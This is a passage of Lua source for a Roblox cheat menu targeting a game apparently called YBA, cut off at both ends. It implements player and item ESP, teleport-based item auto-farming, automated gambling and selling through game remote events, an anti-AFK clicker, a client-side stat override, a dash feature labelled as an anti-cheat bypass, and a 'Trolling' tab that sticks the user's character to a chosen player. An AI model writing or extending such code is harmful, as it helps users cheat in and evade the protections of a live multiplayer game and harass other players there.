    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Text = plr.Name
    tl.TextColor3 = Color3.fromRGB(255, 255, 255)
    tl.TextSize = 24
    tl.TextStrokeTransparency = 0.5
    tl.Font = Enum.Font.SourceSansBold
    tl.Parent = bb
local conn = plr.CharacterAdded:Connect(function(newChar)
        hl.Adornee = newChar
        bb.Adornee = newChar:WaitForChild("Head")
end)
    table.insert(playerESPConnections, conn)
end
local function enablePlayerESP()
for _, plr in pairs(game.Players:GetPlayers()) do
        addPlayerESP(plr)
end
local addedConn = game.Players.PlayerAdded:Connect(function(plr)
        addPlayerESP(plr)
end)
    table.insert(playerESPConnections, addedConn)
end
local function disablePlayerESP()
for _, plr in pairs(game.Players:GetPlayers()) do
if plr.Character then
local hl = plr.Character:FindFirstChild("PlayerESP")
if hl then
                hl:Destroy()
end
local bb = plr.Character:FindFirstChild("PlayerESPName")
if bb then
                bb:Destroy()
end
end
end
for _, conn in pairs(playerESPConnections) do
        conn:Disconnect()
end
    playerESPConnections = {}
end
local itemNotifier = false
local notifierConnection
local function enableItemNotifier()
    notifierConnection = game.Workspace.Item_Spawns.Items.ChildAdded:Connect(function(v)
wait(0.1)
local prox = v:FindFirstChild("ProximityPrompt")
if prox then
local itemName = prox.ObjectText or "Unknown Item"
            notify("YBA Script", itemName .. " has spawned!")
end
end)
end
local function disableItemNotifier()
if notifierConnection then
        notifierConnection:Disconnect()
end
end
local function instantTravelTo(target)
if not player.Character or not player.Character.HumanoidRootPart then return end
local hrp = player.Character.HumanoidRootPart
local targetPos = typeof(target) == "Vector3" and target or target.Position
    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 0.10, 0))
end
local afkCameraOn = false
local originalCameraType = nil
local cameraConnection = nil
local cancelGui = nil
local function enableAFKCamera()
if not (normalFarmOn or afkFarmOn) then
        WindUI:Popup({
                Title = "Warning",
                Icon = "bird",
                Content = "Enable Item Farming to use AFK Camera.",
                Buttons = {
                    {
                        Title = "Ok",
                        Icon = "eye",
                    }
                }
            })
        afkCameraToggle:Set(false)
return
end
    originalCameraType = workspace.CurrentCamera.CameraType
workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
    cameraConnection = RunService.RenderStepped:Connect(function()
if player.Character and player.Character:FindFirstChild("Head") then
local head = player.Character.Head
local time = tick()
local radius = 10
local height = 15
local angle = time * 0.5
local offset = Vector3.new(math.sin(angle) * radius, height, math.cos(angle) * radius)
local camPos = head.Position + offset
local lookAt = head.Position
workspace.CurrentCamera.CFrame = CFrame.new(camPos, lookAt)
end
end)
    cancelGui = Instance.new("ScreenGui")
    cancelGui.Name = "CancelAFK"
    cancelGui.Parent = player.PlayerGui
    cancelGui.ResetOnSpawn = false
local cancelButton = Instance.new("TextButton")
    cancelButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    cancelButton.BorderSizePixel = 0
    cancelButton.Position = UDim2.new(0.5, -100, 0.9, -50)
    cancelButton.Size = UDim2.new(0, 200, 0, 50)
    cancelButton.Font = Enum.Font.SourceSansBold
    cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    cancelButton.TextSize = 24
    cancelButton.Text = "Cancel AFK Camera"
    cancelButton.Parent = cancelGui
    cancelButton.MouseButton1Click:Connect(function()
        afkCameraToggle:Set(false)
end)
local uicorner = Instance.new("UICorner")
    uicorner.Parent = cancelButton
end
local function disableAFKCamera()
if originalCameraType then
workspace.CurrentCamera.CameraType = originalCameraType
end
if cameraConnection then
        cameraConnection:Disconnect()
end
if cancelGui then
        cancelGui:Destroy()
end
end
player.CharacterAdded:Connect(function(char)
if afkCameraOn then
wait(1)
end
end)
local farmMethod = "Normal"
FarmingTab:Dropdown({
    Flag = "FarmMethod",
    Title = "Farm Method",
    Values = {"Normal", "AFK Farming", "Safe Place"},
    Value = "Normal",
    Callback = function(option)
        farmMethod = option
    end
})
FarmingTab:Space()
FarmingTab:Dropdown({
    Flag = "FarmItem",
    Title = "Select Item to Farm",
    SearchBarEnabled = true,
    Values = itemOptions,
    Multi = true,
    Callback = function(selected)
        selectedFarmItems = selected
end
})
FarmingTab:Space()
FarmingTab:Dropdown({
    Flag = "TravelMethod",
    Title = "Travel Method",
    Values = {"Stud", "Tween", "Instant"},
    Value = "Stud",
    Callback = function(option)
        travelMethod = option
    end
})
FarmingTab:Space()
local tpToItemsToggle = FarmingTab:Toggle({
    Flag = "TpToItems",
    Title = "Enable Farming",
    Default = false,
    Callback = function(value)
local method = farmMethod
        if value then
            notify("YBA Script", method .. " enabled.")
            startFarming(method)
            if not game.Workspace:FindFirstChild("WhitePad") then
                local pad = Instance.new("Part")
                pad.Size = Vector3.new(10000, 1, 10000)
                pad.Position = Vector3.new(-139.164612, 60.740036, -372.339508)
                pad.Anchored = true
                pad.CanCollide = true
                pad.Color = Color3.fromRGB(255, 255, 255)
                pad.Transparency = 0.95
                pad.Name = "WhitePad"
                pad.Parent = game.Workspace
                if not game.Workspace:FindFirstChild("UnderwhitePad") then
                local pad = Instance.new("Part")
                pad.Size = Vector3.new(10000, 1, 10000)
                pad.Position = Vector3.new(0, -45, 0)
                pad.Anchored = true
                pad.Color = Color3.fromRGB(255, 255, 255)
                pad.Transparency = 0.5
                pad.Name = "UnderwhitePad"
                pad.Parent = game.Workspace
            end
            end
        else
            notify("YBA Script", "Farming disabled.")
            stopFarming()
            local pad = game.Workspace:FindFirstChild("WhitePad")
            if pad then
                pad:Destroy()
                local underPad = game.Workspace:FindFirstChild("UnderwhitePad")
            if underPad then
                underPad:Destroy()
            end
            end
        end
    end
})
FarmingTab:Space()
FarmingTab:Section({
    Title = "Gamble",
})
local gambleOn = false
local lastGambleTime = 0
local gambleToggle = FarmingTab:Toggle({
    Flag = "Gamble",
    Title = "Enable",
    Default = false,
    Callback = function(value)
        gambleOn = value
        if value then
            notify("YBA Script", "Auto Gamble enabled.")
        else
            notify("YBA Script", "Auto Gamble disabled.")
        end
    end
})
spawn(function()
    while true do
        wait(0.5)
        if gambleOn then
            pcall(function()
                local hasGold = false
                local goldItem = player.Backpack:FindFirstChild("Gold Coin") or (player.Character and player.Character:FindFirstChild("Gold Coin"))
                if goldItem then
                    hasGold = true
                    if goldItem.Parent == player.Backpack then
                        goldItem.Parent = player.Character
                    end
                end
                local money = player.PlayerStats.Money.Value
                if hasGold and money >= 750 then
                    local remote = player.Character:FindFirstChild("RemoteEvent")
                    if remote then
                        remote:FireServer("DialogueInteracted", {
                            ["DialogueName"] = "Item Machine",
                            ["Speaker"] = "Item Machine"
                        })
                        remote:FireServer("EndDialogue", {
                            ["NPC"] = "Item Machine",
                            ["Option"] = "Option1",
                            ["Dialogue"] = "Dialogue1"
                        })
                        lastGambleTime = tick()
                    end
                    wait(3)
                end
            end)
        end
    end
end)
local autoSellMaxToggle = SellingTab:Toggle({
    Flag = "AutoSellMax",
    Title = "Auto Sell on Max",
    Default = false,
    Callback = function(value)
        autoSellMax = value
if autoSellMax then
            notify("YBA Script", "Auto Sell on Max enabled.")
            checkAndSellMax()
else
            notify("YBA Script", "Auto Sell on Max disabled.")
end
end
})
SellingTab:Space()
SellingTab:Dropdown({
    Flag = "AutoSellItems",
    Title = "Auto Sell Items (on Pickup)",
    SearchBarEnabled = true,
    Values = itemOptions,
    Multi = true,
    Callback = function(selected)
        selectedAutoSellItems = selected
end
})
SellingTab:Space()
local autoSellSelectedToggle = SellingTab:Toggle({
    Flag = "AutoSellSelected",
    Title = "Auto Sell Selected on Pickup",
    Default = false,
    Callback = function(value)
        autoSellSelected = value
if autoSellSelected then
            notify("YBA Script", "Auto Sell Selected enabled.")
else
            notify("YBA Script", "Auto Sell Selected disabled.")
end
end
})
SellingTab:Space()
SellingTab:Dropdown({
    Flag = "SellAllItems",
    Title = "Select Items to Sell All Now",
    SearchBarEnabled = true,
    Values = itemOptions,
    Multi = true,
    Callback = function(selected)
        selectedSellAllItems = selected
end
})
SellingTab:Space()
SellingTab:Button({
    Title = "Sell All Selected Now",
    Callback = function()
        sellAllSelected(selectedSellAllItems)
end
})
SellingTab:Space()
local autoSellAllSelectedLoop = false
local autoSellInterval = 3

SellingTab:Slider({
    Flag = "AutoSellInterval",
    Title = "Auto Sell Interval minutes",
    Step = 1,
    Value = {
        Min = 1,
        Max = 10,
        Default = 3
    },
    Callback = function(value)
        autoSellInterval = value
    end
})

SellingTab:Toggle({
    Flag = "AutoSellAllSelectedLoop",
    Title = "Auto Sell All Selected Loop",
    Default = false,
    Callback = function(value)
        autoSellAllSelectedLoop = value
        if value then
            notify("YBA Script", "Auto Sell enabled: Every " .. autoSellInterval .. " minute(s)")
            spawn(function()
                while autoSellAllSelectedLoop do
                    wait(autoSellInterval * 60)
                    if autoSellAllSelectedLoop and #selectedSellAllItems > 0 then
                        sellAllSelected(selectedSellAllItems)
                    end
                end
            end)
        else
            notify("YBA Script", "Auto Sell All Selected disabled.")
        end
    end
})
SellingTab:Space()
SellingTab:Button({
    Title = "Sell All Worthless Items",
    Callback = function()
        sellAllWorthless()
end
})
SellingTab:Space()
SellingTab:Button({
    Title = "Sell Inventory",
    Callback = function()
        sellInventory()
end
})
local itemESPToggle = VisualTab:Toggle({
    Flag = "ItemESP",
    Title = "Item ESP",
    Default = false,
    Callback = function(value)
        itemESP = value
if itemESP then
            notify("YBA Script", "Item ESP enabled.")
            enableItemESP()
else
            notify("YBA Script", "Item ESP disabled.")
            disableItemESP()
end
end
})
VisualTab:Space()
local playerESPToggle = VisualTab:Toggle({
    Flag = "PlayerESP",
    Title = "Player ESP",
    Default = false,
    Callback = function(value)
        playerESP = value
if playerESP then
            notify("YBA Script", "Player ESP enabled.")
            enablePlayerESP()
else
            notify("YBA Script", "Player ESP disabled.")
            disablePlayerESP()
end
end
})
VisualTab:Space()
local itemNotifierToggle = VisualTab:Toggle({
    Flag = "ItemNotifier",
    Title = "Item Spawn Notifier",
    Default = false,
    Callback = function(value)
        itemNotifier = value
if itemNotifier then
            notify("YBA Script", "Item Spawn Notifier enabled.")
            enableItemNotifier()
else
            notify("YBA Script", "Item Spawn Notifier disabled.")
            disableItemNotifier()
end
end
})
AdjustTab:Section({
    Title = "Stud"
})
AdjustTab:Slider({
    Title = "Stud Speed Adjustment (%)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 100
    },
    Callback = function(value)
        studMultiplier = value / 100
    end
})
AdjustTab:Section({
    Title = "Tween"
})
AdjustTab:Slider({
    Title = "Tween Speed Adjustment (%)",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 100
    },
    Callback = function(value)
        tweenMultiplier = value / 100
    end
})
AdjustTab:Section({
    Title = "Tp Delay"
})
AdjustTab:Slider({
    Flag = "TpDelaySlider",
    Title = "Tp Delay (seconds)",
    Step = 0.01,
    Value = {
        Min = 0,
        Max = 1,
        Default = 0.05
    },
    Callback = function(value)
        tpDelay = value
    end
})
local antiAFKToggle = MiscTab:Toggle({
    Flag = "AntiAFK",
    Title = "Anti-AFK",
    Default = false,
    Callback = function(value)
if value then
            notify("YBA Script", "Anti-AFK enabled.")
spawn(function()
while value do
wait(300)
local vu = game:GetService("VirtualUser")
                    vu:CaptureController()
                    vu:ClickButton2(Vector2.new())
end
end)
else
            notify("YBA Script", "Anti-AFK disabled.")
end
end
})
MiscTab:Space()
local originalLighting = {
    Brightness = game.Lighting.Brightness,
    ClockTime = game.Lighting.ClockTime,
    FogEnd = game.Lighting.FogEnd,
    GlobalShadows = game.Lighting.GlobalShadows,
    Ambient = game.Lighting.Ambient
}
local fpsBoosterToggle = MiscTab:Toggle({
    Flag = "FpsBooster",
    Title = "FPS Booster",
    Default = false,
    Callback = function(value)
if value then
            notify("YBA Script", "FPS Booster enabled.")
local lighting = game.Lighting
            lighting.Brightness = 2
            lighting.ClockTime = 14
            lighting.FogEnd = 100000
            lighting.GlobalShadows = false
            lighting.Ambient = Color3.fromRGB(255, 255, 255)
for _, obj in pairs(game.Workspace:GetDescendants()) do
if obj:IsA("Highlight") then
                    obj.Enabled = false
end
end
if game.Lighting:FindFirstChild("Bloom") then
game.Lighting.Bloom.Enabled = false
end
if game.Lighting:FindFirstChild("SunRays") then
game.Lighting.SunRays.Enabled = false
end
if game.Lighting:FindFirstChild("DepthOfField") then
game.Lighting.DepthOfField.Enabled = false
end
else
            notify("YBA Script", "FPS Booster disabled.")
local lighting = game.Lighting
            lighting.Brightness = originalLighting.Brightness
            lighting.ClockTime = originalLighting.ClockTime
            lighting.FogEnd = originalLighting.FogEnd
            lighting.GlobalShadows = originalLighting.GlobalShadows
            lighting.Ambient = originalLighting.Ambient
for _, obj in pairs(game.Workspace:GetDescendants()) do
if obj:IsA("Highlight") then
                    obj.Enabled = true
end
end
if game.Lighting:FindFirstChild("Bloom") then
game.Lighting.Bloom.Enabled = true
end
if game.Lighting:FindFirstChild("SunRays") then
game.Lighting.SunRays.Enabled = true
end
if game.Lighting:FindFirstChild("DepthOfField") then
game.Lighting.DepthOfField.Enabled = true
end
end
end
})
MiscTab:Space()
local afkCameraToggle = MiscTab:Toggle({
    Flag = "AFKCamera",
    Title = "AFK Camera",
    Default = false,
    Callback = function(value)
        afkCameraOn = value
if value then
            notify("YBA Script", "AFK Camera enabled.")
            enableAFKCamera()
else
            notify("YBA Script", "AFK Camera disabled.")
            disableAFKCamera()
end
end
})
MiscTab:Space()
local selectedSoundItems = {}
MiscTab:Dropdown({
    Flag = "SoundItem",
    Title = "Select Item for Sound",
    Values = itemOptions,
    Multi = true,
    Callback = function(selected)
        selectedSoundItems = selected
    end
})
MiscTab:Space()
local soundNotifier = false
local soundNotifierConnection
local function enableSoundNotifier()
    soundNotifierConnection = game.Workspace.Item_Spawns.Items.ChildAdded:Connect(function(v)
        wait(0.1)
        local prox = v:FindFirstChild("ProximityPrompt")
        if prox and table.find(selectedSoundItems, prox.ObjectText) then
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://4590657391"
            sound.Volume = 1
            sound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            sound:Play()
            sound.Ended:Connect(function()
                sound:Destroy()
            end)
        end
    end)
end
local function disableSoundNotifier()
    if soundNotifierConnection then
        soundNotifierConnection:Disconnect()
    end
end
local soundNotifierToggle = MiscTab:Toggle({
    Flag = "SoundNotifier",
    Title = "Sound Notifier",
    Default = false,
    Callback = function(value)
        soundNotifier = value
        if value then
            notify("YBA Script", "Sound Notifier enabled for selected items")
            enableSoundNotifier()
        else
            notify("YBA Script", "Sound Notifier disabled.")
            disableSoundNotifier()
        end
    end
})
MiscTab:Space()
MiscTab:Button({
    Title = "Open Jesus Dialogue",
    Callback = function()
        local remote = player.Character and player.Character:FindFirstChild("RemoteEvent")
        if remote then
            remote:FireServer("PromptTriggered", game.ReplicatedStorage.NewDialogue.Jesus)
            notify("YBA Script", "Opened Jesus dialogue.")
        else
            notify("YBA Script", "RemoteEvent not found.")
        end
    end
})
MiscTab:Button({
    Title = "Anti Vamp Burn",
    Callback = function()
        spawn(function()
            repeat wait() until game:IsLoaded()
            local plr = game:GetService("Players").LocalPlayer;
            while wait() do pcall(function()
                if plr then
                    game:GetService("Players").LocalPlayer.PlayerStats.Race.Value = "Human"
                end
            end )
            end
        end)
        notify("YBA Script", "Anti Vamp Burn enabled.")
    end
})
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local Debris = game:GetService("Debris")
local LocalPlayer = Players.LocalPlayer
local Azure = {Utils = {}}
Azure.Utils.__index = Azure.Utils
function Azure.Utils.MakeUtilController()
    local Utils = {
        Tasks = {};
        Ints = {};
        States = {};
    }
    return setmetatable(Utils, Azure.Utils)
end
function Azure.Utils:SetInt(Value, NewValue)
    if self.Ints[Value] then
        self.Ints[Value].Value = NewValue
    end
end
function Azure.Utils:GetInt(Value)
    return self.Ints[Value] and self.Ints[Value].Value or 0
end
function Azure.Utils:SetState(Value, NewValue)
    if self.States[Value] then
        self.States[Value].Value = NewValue
    end
end
function Azure.Utils:GetState(Value)
    return self.States[Value] and self.States[Value].Value or false
end
function Azure.Utils:AddTask(TaskName, Task)
    if not self.Tasks[TaskName] then
        self.Tasks[TaskName] = Task
    end
    return Task
end
function Azure.Utils:DisconnectTask(TaskName)
    if self.Tasks[TaskName] and self.Tasks[TaskName].Connected then
        self.Tasks[TaskName]:Disconnect()
        self.Tasks[TaskName] = nil
    end
end
function Azure.Utils:GetPlayer()
    return LocalPlayer
end
function Azure.Utils:GetCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end
function Azure.Utils:GetHumanoid()
    local Character = self:GetCharacter()
    return Character and Character:FindFirstChildWhichIsA("Humanoid")
end
function Azure.Utils:GetHRP()
    local Character = self:GetCharacter()
    return Character and Character:FindFirstChild("HumanoidRootPart")
end
function Azure.Utils:GetStroke()
    local StrokeDir = 180
    local Anim = "6926086304"
  
    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
        StrokeDir = 90
        Anim = "6926086567"
    elseif UserInputService:IsKeyDown(Enum.KeyCode.D) then
        StrokeDir = -90
        Anim = "6926086883"
    elseif UserInputService:IsKeyDown(Enum.KeyCode.W) then
        StrokeDir = 0
        Anim = "6926086032"
    end
  
    return StrokeDir, Anim
end
local Util = Azure.Utils.MakeUtilController()
Util.Ints = {
    ["InfTick"] = {Value = tick()},
    ["InfDelay"] = {Value = 1},
    ["DashPower"] = {Value = 50}
}
Util.States = {
    ["Infinite Dash"] = {Value = false}
}
local DashAnims = Instance.new("Folder", workspace)
DashAnims.Name = "DashAnims_" .. Util:GetPlayer().UserId
MiscTab:Section({
    Title = "Infinite Dash",
})
local infiniteDashToggle = MiscTab:Toggle({
    Flag = "InfiniteDash",
    Title = "Infinite Dash",
    Default = false,
    Callback = function(State)
        Util:SetState("Infinite Dash", State)
      
        if State then
            local conn = UserInputService.InputBegan:Connect(function(Input, GameProcessed)
                if GameProcessed then return end
              
                local dashKey = Util:GetPlayer().PlayerStats.DashKey.Value
                if Input.KeyCode == Enum.KeyCode[dashKey] and (tick() - Util:GetInt("InfTick")) >= Util:GetInt("InfDelay") then
                    Util:SetInt("InfTick", tick())
                  
                    local humanoid = Util:GetHumanoid()
                    local hrp = Util:GetHRP()
                    if not humanoid or not hrp then return end
                  
                    local Dir, AnimID = Util:GetStroke()
                  
                    local anim = Instance.new("Animation")
                    anim.Name = "YBA_AntiCheat_Bypass_REAL"
                    anim.AnimationId = "rbxassetid://" .. AnimID
                    anim.Parent = DashAnims
                  
                    local track = humanoid:LoadAnimation(anim)
                    track:Play()
                  
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = (hrp.CFrame * CFrame.Angles(0, math.rad(Dir), 0)).lookVector * Util:GetInt("DashPower")
                    bv.MaxForce = Vector3.new(55555, 1000, 55555)
                    bv.Parent = hrp
                  
                    Debris:AddItem(bv, 0.25)
                end
            end)
          
            Util:AddTask("InfDash", conn)
        notify("YBA Script", "Infinite Dash: Enabled.")
        else
            Util:DisconnectTask("InfDash")
          
            for _, v in pairs(DashAnims:GetChildren()) do
                v:Destroy()
            end
          
        notify("YBA Script", "Infinite Dash: Disabled.")
        end
    end
})
MiscTab:Slider({
    Title = "Dash Power",
    Step = 1,
    Value = {Min=10, Max=1000, Default=50},
    Callback = function(Value)
        Util:SetInt("DashPower", math.clamp(Value, 10, 1000))
    end
})
MiscTab:Slider({
    Title = "Dash Delay",
    Step = 0.1,
    Value = {Min=0, Max=3.5, Default=1},
    Callback = function(Value)
        Util:SetInt("InfDelay", math.clamp(Value, 0, 3.5))
    end
})
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera
local BACK_DISTANCE = 2
local BACK_HEIGHT = 0.5
local PLAYER_HEIGHT = 20
local ALIGN_RESPONSIVENESS = 250
local ALIGN_MAX_FORCE = 1e7
local CHECK_SCAN_INTERVAL = 1.0
local SMOOTH_FALLBACK_ALPHA = 0.85
local scanTimer = 0
local modelCache = {}
local function isCharacterModel(m)
if not m or not m:IsA("Model") then return false end
return m:FindFirstChild("Humanoid") and m:FindFirstChild("HumanoidRootPart")
end
local function rebuildModelCache()
    modelCache = {}
for _, child in ipairs(workspace:GetChildren()) do
if isCharacterModel(child) then
            table.insert(modelCache, child)
else
for _, c2 in ipairs(child:GetChildren()) do
if isCharacterModel(c2) then table.insert(modelCache, c2) end
end
end
end
for _, pl in ipairs(Players:GetPlayers()) do
if pl ~= player and pl.Character and isCharacterModel(pl.Character) then
            table.insert(modelCache, pl.Character)
end
end
end
rebuildModelCache()
workspace.ChildAdded:Connect(function(c)
    if isCharacterModel(c) then
        table.insert(modelCache, c)
    else
        for _, c2 in ipairs(c:GetChildren()) do
            if isCharacterModel(c2) then
                table.insert(modelCache, c2)
            end
        end
    end
end)
workspace.ChildRemoved:Connect(function(c)
    for i = #modelCache, 1, -1 do
        if modelCache[i] == c then
            table.remove(modelCache, i)
        end
    end
end)
Players.PlayerAdded:Connect(function(pl)
    pl.CharacterAdded:Connect(function(ch)
if isCharacterModel(ch) then table.insert(modelCache, ch) end
end)
end)
Players.PlayerRemoving:Connect(function(pl)
if pl.Character then
for i = #modelCache, 1, -1 do if modelCache[i] == pl.Character then table.remove(modelCache, i) end end
end
end)
local function findClosestByName(name)
if not name or name == "" then return nil end
local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
if not root then return nil end
local rootPos = root.Position
local lower = name:lower()
local closest, minD = nil, math.huge
for _, pl in ipairs(Players:GetPlayers()) do
if pl ~= player and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
local match = false
if pl.Name:lower():find(lower) then match = true end
if pl.DisplayName and pl.DisplayName:lower():find(lower) then match = true end
if match then
local hrp = pl.Character:FindFirstChild("HumanoidRootPart")
local hum = pl.Character:FindFirstChild("Humanoid")
if hrp and hum and hum.Health > 0 then
local d = (hrp.Position - rootPos).Magnitude
if d < minD then minD, closest = d, pl.Character end
end
end
end
end
for _, model in ipairs(modelCache) do
if model and model.Parent and model ~= player.Character then
if model.Name:lower():find(lower) then
local hrp = model:FindFirstChild("HumanoidRootPart")
local hum = model:FindFirstChild("Humanoid")
if hrp and hum and hum.Health > 0 then
local d = (hrp.Position - rootPos).Magnitude
if d < minD then minD, closest = d, model end
end
end
end
end
return closest
end


local activeAligns = {}
local currentTargetForEntity = {}
local function cleanupAlignFor(entity)
if not entity then return end
local hrp = entity:FindFirstChild("HumanoidRootPart")
if hrp then
for _, c in ipairs(hrp:GetChildren()) do
if tostring(c.Name):match("^Stick_") then
                c:Destroy()
end
end
end
    activeAligns[entity] = nil
    currentTargetForEntity[entity] = nil
end
local function createAlignsFor(entity, targetHRP, stickMode)
if not entity or not targetHRP then return nil end
    cleanupAlignFor(entity)
local hrp = entity:FindFirstChild("HumanoidRootPart")
if not hrp then
        hrp = entity:FindFirstChild("Torso") or entity:FindFirstChild("UpperTorso")
end
if not hrp then
local ok
        ok, hrp = pcall(function() return entity:WaitForChild("HumanoidRootPart", 0.5) end)
if not ok then hrp = nil end
end
if not hrp then return nil end
local offset = Vector3.new(0,0,0)
if stickMode == "back" then
        offset = Vector3.new(0, BACK_HEIGHT, -BACK_DISTANCE)
end
local attA = Instance.new("Attachment")
    attA.Name = "Stick_AttA"
    attA.Parent = hrp
    attA.Position = Vector3.new(0,0,0)
local attB = Instance.new("Attachment")
    attB.Name = "Stick_AttB"
    attB.Parent = targetHRP
    attB.Position = offset
local alignPos = Instance.new("AlignPosition")
    alignPos.Name = "Stick_AlignPos"
    alignPos.Attachment0 = attA
    alignPos.Attachment1 = attB
    alignPos.MaxForce = ALIGN_MAX_FORCE
    alignPos.Responsiveness = ALIGN_RESPONSIVENESS
    alignPos.RigidityEnabled = false
    alignPos.Parent = hrp
local alignOri = Instance.new("AlignOrientation")
    alignOri.Name = "Stick_AlignOri"
    alignOri.Attachment0 = attA
    alignOri.Attachment1 = attB
    alignOri.MaxTorque = ALIGN_MAX_FORCE
    alignOri.Responsiveness = ALIGN_RESPONSIVENESS
    alignOri.Parent = hrp
    activeAligns[entity] = {attA = attA, attB = attB, alignPos = alignPos, alignOri = alignOri, stickMode = stickMode}
    currentTargetForEntity[entity] = targetHRP
if entity == player.Character then
notify("Sticker", "Player align applied (mode="..tostring(stickMode)..")")
end
return activeAligns[entity]
end
local function smoothFallback(entity, targetHRP, stickMode, isAlive)
local hrp = entity and entity:FindFirstChild("HumanoidRootPart")
if not hrp or not targetHRP then return end
local desiredPos
if stickMode == "back" then
        desiredPos = targetHRP.Position - targetHRP.CFrame.LookVector * BACK_DISTANCE + Vector3.new(0, BACK_HEIGHT, 0)
elseif stickMode == "Down" then
local height = isAlive and -PLAYER_HEIGHT or PLAYER_HEIGHT
        desiredPos = targetHRP.Position + Vector3.new(0, height, 0)
elseif stickMode == "Up" then
local height = isAlive and PLAYER_HEIGHT or -PLAYER_HEIGHT
        desiredPos = targetHRP.Position + Vector3.new(0, height, 0)
else
return
end
local look = -Vector3.new(targetHRP.CFrame.LookVector.X, 0, targetHRP.CFrame.LookVector.Z).Unit
local yaw = math.atan2(look.X, look.Z)
local desiredCFrame = CFrame.new(desiredPos) * CFrame.Angles(0, yaw, 0)
    hrp.CFrame = hrp.CFrame:Lerp(desiredCFrame, SMOOTH_FALLBACK_ALPHA)
end
local viewing = false
local prevCameraSubject = nil
local prevCameraType = nil
local viewingStand = nil
local orbit = {
    yaw = 0,
    pitch = 0,
    radius = 8,
    minRadius = 2,
    maxRadius = 60,
    sensitivity = 0.0035,
    pitchMin = -math.pi/2 + 0.1,
    pitchMax = math.pi/2 - 0.1,
    dragging = false,
    inputChangedConn = nil,
    inputBeganConn = nil,
    inputEndedConn = nil,
    renderConn = nil
}
local function enableOrbitCamera(stand)
if not stand or not stand:FindFirstChild("HumanoidRootPart") then
        notify("View Stand", "Can't view: stand missing HRP.")
return
end
    viewingStand = stand
    prevCameraSubject = camera.CameraSubject
    prevCameraType = camera.CameraType
local standPos = stand.HumanoidRootPart.Position
local camCF = camera.CFrame
local toStand = (camCF.Position - standPos)
    orbit.radius = math.clamp(toStand.Magnitude, orbit.minRadius, orbit.maxRadius)
local dir = toStand.Unit
local pitch = math.asin(math.clamp(dir.Y, -1, 1)) * -1
local yaw = math.atan2(dir.X, dir.Z)
    orbit.yaw = yaw
    orbit.pitch = pitch
    camera.CameraType = Enum.CameraType.Scriptable
    orbit.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
if processed then return end
if input.UserInputType == Enum.UserInputType.MouseButton2 then
            orbit.dragging = true
            UserInputService.MouseIconEnabled = false
end
end)
    orbit.inputEndedConn = UserInputService.InputEnded:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton2 then
            orbit.dragging = false
            UserInputService.MouseIconEnabled = true
end
end)
    orbit.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
if input.UserInputType == Enum.UserInputType.MouseMovement and orbit.dragging then
            orbit.yaw = orbit.yaw - input.Delta.X * orbit.sensitivity
            orbit.pitch = math.clamp(orbit.pitch - input.Delta.Y * orbit.sensitivity, orbit.pitchMin, orbit.pitchMax)
elseif input.UserInputType == Enum.UserInputType.MouseWheel then
            orbit.radius = math.clamp(orbit.radius - input.Position.Z, orbit.minRadius, orbit.maxRadius)
end
end)
    orbit.renderConn = RunService.RenderStepped:Connect(function()
if not viewing or not viewingStand or not viewingStand.Parent then return end
local hrp = viewingStand:FindFirstChild("HumanoidRootPart")
if not hrp then return end
local standPos = hrp.Position
local rot = CFrame.Angles(orbit.pitch, orbit.yaw, 0)
local offset = rot:VectorToWorldSpace(Vector3.new(0, 0, orbit.radius))
local camPos = standPos + offset
        camera.CFrame = CFrame.new(camPos, standPos)
end)
    notify("View Stand", "Now viewing your stand")
    viewing = true
end
local function disableOrbitCamera()
    viewing = false
    viewingStand = nil
if orbit.inputChangedConn then orbit.inputChangedConn:Disconnect() orbit.inputChangedConn = nil end
if orbit.inputBeganConn then orbit.inputBeganConn:Disconnect() orbit.inputBeganConn = nil end
if orbit.inputEndedConn then orbit.inputEndedConn:Disconnect() orbit.inputEndedConn = nil end
if orbit.renderConn then orbit.renderConn:Disconnect() orbit.renderConn = nil end
pcall(function()
if prevCameraSubject then camera.CameraSubject = prevCameraSubject end
if prevCameraType then camera.CameraType = prevCameraType end
end)
    UserInputService.MouseIconEnabled = true
    notify("View Stand", "Camera restored.")
end
local function enableView(stand)
if not stand or not stand:FindFirstChild("Humanoid") and not stand:FindFirstChild("HumanoidRootPart") then
        notify("View Stand", "Equipt your stand first")
return
end
if viewing then return end
    enableOrbitCamera(stand)
end
local function disableView()
if not viewing then return end
    disableOrbitCamera()
end
local stickerEnabled = false
local viewEnabled = false
local method = "normal"
local targetName = ""
TrollingTab:Section({Title = "Trolling"})
TrollingTab:Input({
    Flag = "TargetName",
    Title = "Enter Player/Mob Name",
    Callback = function(value)
        targetName = value
    end
})
TrollingTab:Space()
local stickerToggle = TrollingTab:Toggle({
    Flag = "Sticker",
    Title = "Stand Attach",
    Default = false,
    Callback = function(value)
        stickerEnabled = value
if stickerEnabled then
        notify("YBA Script", "Sticker enabled for: ".. (targetName ~= "" and targetName or "<empty>"))
if method == "Up" or method == "Down" then
            enableNoclip()
end
else
        notify("YBA Script", "Sticker disabled")
for entity, _ in pairs(activeAligns) do cleanupAlignFor(entity) end
        disableNoclip()
end
    end
})
TrollingTab:Space()
local viewToggle = TrollingTab:Toggle({
    Flag = "ViewStand",
    Title = "View Stand",
    Default = false,
    Callback = function(value)
        viewEnabled = value
if value then
local stand = getStand()
if not stand then
